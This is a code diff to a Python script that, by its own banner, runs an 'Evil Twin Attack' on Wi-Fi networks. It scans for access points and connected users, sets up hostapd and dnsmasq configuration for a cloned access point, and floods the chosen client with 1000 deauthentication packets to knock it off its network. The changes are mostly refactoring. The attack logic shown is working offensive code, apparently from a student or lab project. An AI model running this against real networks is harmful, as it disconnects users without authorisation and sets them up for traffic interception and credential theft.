@@ -6,7 +6,7 @@ import time
 import logging
 import MonitorMode as mm
 import CreateConf as cc
-import FakeAP as fa
+import FakeAP as f_ap
 import signal
 
 
@@ -59,22 +59,26 @@ def DisConnectAttack(target_mac , gateway_mac, iface):
 	# send the packet
 	sendp(packet, inter=0.2, count=1000, iface=iface,verbose=1)
 
+def create_conf_file(iface , ssid):
+    cc.Create_hostapd(iface, ssid)
+    cc.Create_dnsmasq(iface)
+
+
 
 def main():
     global iface ,ap_mac
-    iface = input("please enter your interface: ")
-    net_stick_iface= input("Please enter the of your net-stick interface: ")
+    iface = input("please enter the first interface name: ")
+    iface2= input("Please enter the second interface name: ")
     iface = mm.Change_to_MonitorMode_airmon(iface)
     print("********Evil Twin Attack*********")
-    time.sleep(1)
+    time.sleep(3)
     Wifi_scaning()
     # Choose wifi to attack
     if len(ap_list) > 0 :
         mac_adder = int(input("\nEnter the index of the ssid you want to attack: ")) -1
         ap_mac = ap_list[mac_adder]
         ssid_name = ssid_list[mac_adder]
-        cc.Create_hostapd(iface, ssid_name)
-        cc.Create_dnsmasq(iface)
+        create_conf_file(iface2 , ssid_name)
         Users_scaning()
     #Choose user to attack
     if len(users_list) > 0 :
@@ -84,7 +88,7 @@ def main():
         disconnectThread.start()
         time.sleep(3)
         print("process keep going...")
-        fa.start(net_stick_iface)
+        #f_ap.start(net_stick_iface)
         while True:
             try:
                 time.sleep(2) 
